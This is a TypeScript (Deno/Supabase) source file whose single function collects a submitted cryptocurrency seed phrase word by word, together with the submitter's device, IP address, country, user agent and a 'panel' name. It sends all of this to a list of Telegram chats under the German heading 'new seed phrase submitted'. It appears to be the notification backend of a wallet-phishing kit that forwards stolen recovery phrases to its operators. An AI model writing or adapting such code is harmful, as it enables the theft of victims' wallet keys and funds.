// deno-lint-ignore-file no-explicit-any
import { serviceClient } from "./session.ts";

function esc(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

export async function sendTelegramForSession(sessionId: string): Promise<{
  sent: number;
  failed: number;
  errors: string[];
}> {
  const token = Deno.env.get("TELEGRAM_BOT_TOKEN");
  if (!token) return { sent: 0, failed: 0, errors: ["TELEGRAM_BOT_TOKEN missing"] };

  const supabase = serviceClient();

  const [{ data: session }, { data: words }, { data: chats }] = await Promise.all([
    supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle(),
    supabase.from("session_seed_words").select("*").eq("session_id", sessionId).order("position"),
    supabase.from("telegram_chat_ids").select("chat_id, label").eq("active", true),
  ]);

  if (!session) return { sent: 0, failed: 0, errors: ["session not found"] };
  if (!chats || chats.length === 0) return { sent: 0, failed: 0, errors: ["no active chats"] };

  const lines: string[] = [];
  lines.push(`<b>🔔 Neue Seed-Phrase eingereicht</b>`);
  lines.push("");
  lines.push(`<b>Device:</b> ${esc(session.device ?? "—")}`);
  lines.push(`<b>Panel:</b> ${esc(session.panel_slug ?? "—")}`);
  lines.push(`<b>IP:</b> ${esc(session.ip ?? "—")}${session.country ? ` (${esc(session.country)})` : ""}`);
  lines.push(`<b>Länge:</b> ${session.seed_length ?? (words?.length ?? 0)}`);
  if (session.user_agent) lines.push(`<b>UA:</b> <code>${esc(String(session.user_agent).slice(0, 140))}</code>`);
  lines.push("");
  lines.push(`<b>Seed:</b>`);
  const sortedWords = (words ?? []).slice().sort((a: any, b: any) => a.position - b.position);
  for (const w of sortedWords) {
    lines.push(`<code>${w.position.toString().padStart(2, "0")}. ${esc(w.word)}</code>`);
  }
  lines.push("");
  lines.push(`<b>Session:</b> <code>${esc(session.id)}</code>`);

  const text = lines.join("\n");
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const results = await Promise.allSettled(
    chats.map((c: any) =>
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: c.chat_id, text, parse_mode: "HTML" }),
      }).then(async (r) => {
        if (!r.ok) throw new Error(`${c.chat_id}: ${r.status} ${await r.text()}`);
        return c.chat_id;
      }),
    ),
  );

  const sent = results.filter((r) => r.status === "fulfilled").length;
  const failed = results.length - sent;
  const errors = results
    .filter((r): r is PromiseRejectedResult => r.status === "rejected")
    .map((r) => String(r.reason));

  await supabase.from("session_events").insert({
    session_id: sessionId,
    event_type: "telegram_sent",
    payload: { sent, failed, errors },
  });

  return { sent, failed, errors };
}
